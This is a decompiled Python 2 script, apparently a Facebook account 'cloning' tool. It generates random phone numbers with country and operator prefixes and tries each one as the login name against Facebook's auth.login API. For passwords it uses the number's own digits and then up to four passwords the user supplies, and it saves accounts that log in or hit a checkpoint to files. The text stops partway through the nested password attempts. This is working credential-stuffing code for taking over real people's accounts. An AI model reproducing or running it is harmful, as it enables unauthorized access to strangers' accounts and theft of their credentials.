# Decompiled By DarkXploit
# Author Team Dark Hunter 141
# Github : https://github.com/darkhunter141
# If If you see this and you copy it, give me credit
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 All.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = "\n\x1b[1;93m::::::::::::'###::::'##:::::::'##:::::::\n:::::::::::'## ##::: ##::::::: ##:::::::\n::::::::::'##:. ##:: ##::::::: ##:::::::\n:::::::::'##:::. ##: ##::::::: ##:::::::\n::::::::: #########: ##::::::: ##:::::::\n::::::::: ##.... ##: ##::::::: ##:::::::\n::::::::: ##:::: ##: #######: ########:\n:::::::::..:::::..::........::........::\n\n\x1b[1;92m#  ..######...#######..##.....##.##....##.########.########..##....##\n#  .##....##.##.....##.##.....##.###...##....##....##.....##..##..##.\n#  .##.......##.....##.##.....##.####..##....##....##.....##...####..\n#  .##.......##.....##.##.....##.##.##.##....##....########.....##...\n#  .##.......##.....##.##.....##.##..####....##....##...##......##...\n#  .##....##.##.....##.##.....##.##...###....##....##....##.....##...\n#  ..######...#######...#######..##....##....##....##.....##....##...\n\n\x1b[1;96m..######..##........#######..##....##.########.########.\n.##....##.##.......##.....##.###...##.##.......##.....##\n.##.......##.......##.....##.####..##.##.......##.....##\n.##.......##.......##.....##.##.##.##.######...########.\n.##.......##.......##.....##.##..####.##.......##...##..\n.##....##.##.......##.....##.##...###.##.......##....##.\n..######..########..#######..##....##.########.##.....##\n\n\x1b[1;91m======\x1b[1;92m=====\x1b[1;91m=====\x1b[1;92m=====\x1b[1;91m======\x1b[1;92m=====\x1b[1;91m=====\x1b[1;92m=====\x1b[1;91m====\x1b[1;92m====\x1b[1;91m=====\n\x1b[1;96m AUTHOR : HUNTERBOY ALAMIN\n\x1b[1;92m FACEBOOK : MD ALAMIN KHAN\n\x1b[1;93m CONTACT : https://www.facebook.com/alaminkhan.60\n\x1b[1;92m======\x1b[1;91m=====\x1b[1;92m=====\x1b[1;91m====\x1b[1;92m======\x1b[1;91m======\x1b[1;92m=====\x1b[1;91m=====\x1b[1;92m=====\x1b[1;91m========\n"
print logo
CorrectUsername = 'ALAMINKHAN'
CorrectPassword = 'HUNTERBOY'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;93m\x1b[1;92mTool Username \x1b[1;93m:\x1b[1;93m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;91m \x1b[1;92mTool Password \x1b[1;93m:\x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as HUNTERBOY ALAMIN'
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;94mWrong Password'
            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
    else:
        print '\x1b[1;94mWrong Username'
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')

back = 0
back = 0
successful = []
cpb = []
oks = []
id = []
os.system('xdg-open https://www.facebook.com/alaminkhan.60')

def menu():
    os.system('clear')
    print logo
    print
    print 47 * '\x1b[1;93m=\x1b[1;91m=\x1b[1;92m='
    print
    psb('\x1b[1;91m[\x1b[1;92m01\x1b[1;91m]\x1b[1;91m BANGLADESH                       \x1b[1;91m[\x1b[1;92m02\x1b[1;91m]\x1b[1;92m AMERICA')
    psb('\x1b[1;91m[\x1b[1;92m03\x1b[1;91m]\x1b[1;93m UNITED KINGDOM                   \x1b[1;91m[\x1b[1;92m04\x1b[1;91m]\x1b[1;94m INDIA')
    psb('\x1b[1;91m[\x1b[1;92m05\x1b[1;91m]\x1b[1;95m BRAZIL                           \x1b[1;91m[\x1b[1;92m06\x1b[1;91m]\x1b[1;96m JAPAN')
    psb('\x1b[1;91m[\x1b[1;92m07\x1b[1;91m]\x1b[1;97m KOREA                            \x1b[1;91m[\x1b[1;92m08\x1b[1;91m]\x1b[1;92m ITLY')
    psb('\x1b[1;91m[\x1b[1;92m09\x1b[1;91m]\x1b[1;94m SPAIN                            \x1b[1;91m[\x1b[1;92m10\x1b[1;91m]\x1b[1;93m POLAND')
    psb('\x1b[1;91m[\x1b[1;92m11\x1b[1;91m]\x1b[1;96m PAKISTAN                         \x1b[1;91m[\x1b[1;92m12\x1b[1;91m]\x1b[1;93m INDONESIA')
    psb('\x1b[1;91m[\x1b[1;92m13\x1b[1;91m]\x1b[1;94m PERU                             \x1b[1;91m[\x1b[1;92m14\x1b[1;91m]\x1b[1;96m AUSTRALIA')
    psb('\x1b[1;91m[\x1b[1;92m15\x1b[1;91m]\x1b[1;91m CANADA                           \x1b[1;91m[\x1b[1;92m16\x1b[1;91m]\x1b[1;93m CHINA')
    psb('\x1b[1;91m[\x1b[1;92m17\x1b[1;91m]\x1b[1;92m DENMARK                          \x1b[1;91m[\x1b[1;92m18\x1b[1;91m]\x1b[1;94m FRANCE')
    psb('\x1b[1;91m[\x1b[1;92m19\x1b[1;91m]\x1b[1;91m GERMANY                          \x1b[1;91m[\x1b[1;92m20\x1b[1;91m]\x1b[1;92m MALAYSIA')
    psb('\x1b[1;91m[\x1b[1;92m21\x1b[1;91m]\x1b[1;95m SARI LANKA                       \x1b[1;91m[\x1b[1;92m22\x1b[1;91m]\x1b[1;96m TURKEY')
    psb('\x1b[1;91m[\x1b[1;92m23\x1b[1;91m]\x1b[1;92m U.A.E                            \x1b[1;91m[\x1b[1;92m24\x1b[1;91m]\x1b[1;93m SAUDIA ARABIA')
    psb('\x1b[1;91m[\x1b[1;92m26\x1b[1;91m]\x1b[1;91m ISRIL                 ')
    psb('\x1b[1;91m[\x1b[1;92m00\x1b[1;91m]\x1b[1;91m EXIT  ')
    print
    print 47 * '\x1b[1;93m=\x1b[1;91m=\x1b[1;92m='
    action()


def action():
    global cpb
    global oks
    HUNTER = raw_input('\n\n \x1b[1;94mCHOOSE ANY CODE>>>>>>>  ')
    if HUNTER == 'please wait ':
        print '[!] '
        action()
    elif HUNTER == '1':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;91m 175 , 165 , 191 , 192 , 193 , 194 , 195 , 196 , 197 , 198 , 199'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose any code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '2':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m 555 , 786 , 815 , 315 , 256 , 401 , 718 , 917 , 202 , 701 , 303 , 703 , 803 , 999 , 708 , 559 , 310 , 809 , 551'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose any code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '3':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;92m 715 , 785 , 765 , 725 , 745 ,735 , 737 , 706 , 748 , 783 , 739 , 759 , 790'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input(' \x1b[1;92mchoose any code  : ')
            k = '+44'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '4':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;96m905 , 975 , 755 , 855 , 954, 897, 967, 937, 700, 727, 965, 786 , 874 , 856 , 566 , 590 , 527 , 568 , 578'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input(' \x1b[1;92mchoose code  : ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '5':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;92m127 , 179 , 117 , 853 , 318 , 219 , 834 , 186 , 479 , 113'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose code  : ')
            k = '+55'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '6':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;94m11 , 12 , 19 , 16 , 15 , 13 , 14 , 18 , 17'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose any code  : ')
            k = '+81'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '7':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose any code  : ')
            k = '+82'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '8':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m311 , 323 , 385 , 388 , 390 , 391 , 371 , 380 , 368 , 386 , 384 , 332 , 344 , 351 , 328'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;92m choose any code  : ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '9':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '10':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '11':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m01, ~to~~, 49'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '12':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m81,83,85,84,89,'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '13':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.91,92,93,94,95,96,97,98,99'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+51'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '14':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+61'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '15':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '16':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input(' \x1b[1;95mchoose code  : ')
            k = '+86'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == "17'":
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input(' \x1b[1;95mchoose code  : ')
            k = '+45'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '18':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+33'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '19':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+49'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '20':
        os.system('clear')
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+60'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '21':
        os.system('clear')
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+94'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '22':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+90'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '23':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+971'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '24':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+966'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '25':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+972'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '26':
        os.system('clear')
        print logo
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        print '\x1b[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902'
        print 47 * '\x1b[1;97m=\x1b[1;94m=\x1b[1;93m='
        try:
            c = raw_input('\x1b[1;95m choose code  : ')
            k = '+98'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            HUNTER()

    elif HUNTER == '00':
        login()
    else:
        print '\x1b[1;91m[*] PLEASE SELECT ANY VALID NUMBER DONT ENTER 0 BEFORE THE NUMBER LIKE IF YOU WANT TO CLONE BANGLADESHI ACCOUNTS TYPE 1 NOT 01 LIKE THAT NUMBERS ARE ADDED BEFORE THE COUNTRIES SO ENTER THAT NUMBER OF THE COUNTRY YOU WANT TO CLONE(HUNTERBOY)'
        action()
    print '\x1b[1;93mNOTE:IN THIS TOOL I ADDED A FEATURE SO THAT PEOPLE CAN CLONE EVEN USING THEIR OWN GIVEN PASSWORDS SO THAT THEY CAN GET ACCOUNTS ACCORDING TO THEIR CHOICES PLEASE ENTER WORDS THAT ARE MORE THAN 6 DOGITS.IF THERE ARE NO OF YOUR GIVEN PASSWORDS THE AUTOMATIC CRACKER WILL START AND WILL CLONE AUTOMATICALLY '
    print 47 * '\x1b[1;94m=\x1b[1;92m=\x1b[1;91m='
    hunter = raw_input('\x1b[1;92m TYPE ANY PASSWORD NO1: ')
    print 47 * '\x1b[1;93m=\x1b[1;91m=\x1b[1;94m='
    hunterr = raw_input('\x1b[1;93m TYPE ANY PASSWORD NO2 : ')
    print 47 * '\x1b[1;92m=\x1b[1;91m=\x1b[1;95m='
    hunterrr = raw_input('\x1b[1;94m TYPE ANY PASSWORD NO3 :')
    print 47 * '\x1b[1;95m=\x1b[1;92m=\x1b[1;94m='
    hunterrrr = raw_input('\x1b[1;96m TYPE ANY PASSWORD NO4 : ')
    print 47 * '\x1b[1;94m=\x1b[1;93m=\x1b[1;92m='
    xxx = str(len(id))
    psb('[\xe2\x9c\x93]\x1b[1;92m TOTAL NUMBERS: ' + '60000')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93]\x1b[1;93m PLEASE WAIT, PROCESS IS START...')
    time.sleep(0.5)
    psb('[!]\x1b[1;96m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47 * '\x1b[1;93m==\x1b[1;94m=='
    psb('\x1b[1;91m       TOOL STATED CLONING PLEASE WAIT ')
    print 47 * '\x1b[1;92m=\x1b[1;91m='
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[\x1b[1;92mAUTO PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m >>> \x1b[1;92m' + pass1 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AUTO PASS-CHECKPOINT] \x1b[1;91m  ' + k + c + user + '\x1b[1;91m >>> \x1b[1;91m' + pass1 + ' \x1b[1;96m[LOG IN AFTER 80 HOURS]' + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = hunter
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m >>> \x1b[1;92m' + pass2 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass2 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = hunterr
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass3 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass3 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = hunterrr
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass4 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass4 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                            pass5 = hunterrrr
